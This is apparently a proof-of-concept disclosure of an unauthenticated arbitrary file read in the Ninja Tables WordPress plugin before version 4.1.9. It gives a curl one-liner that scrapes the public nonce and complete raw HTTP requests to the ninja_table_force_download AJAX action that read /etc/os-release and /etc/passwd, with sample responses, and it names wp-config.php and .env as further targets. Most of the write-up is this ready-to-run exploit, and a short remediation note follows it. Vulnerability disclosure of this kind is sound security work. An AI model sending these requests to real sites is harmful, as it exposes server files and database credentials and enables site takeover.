#  Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read [LFI]

Good Day!  
I truly hope everything is awesome on your side of the screen! 😊

##  Vulnerability: Unauthenticated Arbitrary File Read via `ninja_table_force_download`

The Ninja Tables plugin for WordPress (versions < 4.1.9) contains a critical vulnerability in the AJAX action `ninja_table_force_download`. Improper validation of the `url` parameter allows an unauthenticated attacker to read arbitrary files from the server such as `/etc/passwd`, `/etc/os-release`, and `wp-config.php`.

---

##  Proof of Concept (PoC) Steps

### 1. **Extract the Nonce**

```bash
curl -s https://target.com | grep -oP '"ninja_table_public_nonce":"\K[a-z0-9]+'
```

 like output:
```
3d22ded27c
```

<img width="3024" height="1964" alt="image" src="https://github.com/user-attachments/assets/14e7480a-867a-4e0c-b797-79a83f355174" />



---

### 2. **Read `/etc/os-release`**

####  Raw Request

```
GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce=3d22ded27c HTTP/2
Host: redacted.com
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Gpc: 1
Accept-Language: en-US,en;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

####  Expected Response

```http
HTTP/2 200 OK
content-type: application/octet-stream

NAME="Ubuntu"
PRETTY_NAME="Ubuntu 22.04.4 LTS"
ID=ubuntu
...
```

---

### 3. **Read `/etc/passwd`**



<img width="3024" height="1964" alt="image" src="https://github.com/user-attachments/assets/16bf77bc-e09a-4b3f-9494-2ae123df80a9" />

####  Raw Request

```
GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/passwd&ninja_table_public_nonce=3d22ded27c HTTP/2
Host: redacted.com
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Gpc: 1
Accept-Language: en-US,en;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

####  Expected Response

```http
HTTP/2 200 OK
content-type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

May you be well on your side of the screen :)

---

##  Impact

* **Unauthenticated Local File Read**
* Disclosure of sensitive server files (`/etc/passwd`, `/wp-config.php`, `.env`, logs)
* May lead to **database credential leakage**, **full site compromise**, or **privilege escalation**

---

##  Remediation

Update the **Ninja Tables plugin** to version **4.1.9 or higher** where this issue has been patched.

---

##  References

* [Xbow Security Blog](https://xbow.com/blog/xbow-ninja-tables/)
* [NinjaTables Official Changelog](https://ninjatables.com/docs/change-log/#521-date-july-9-2025)

---
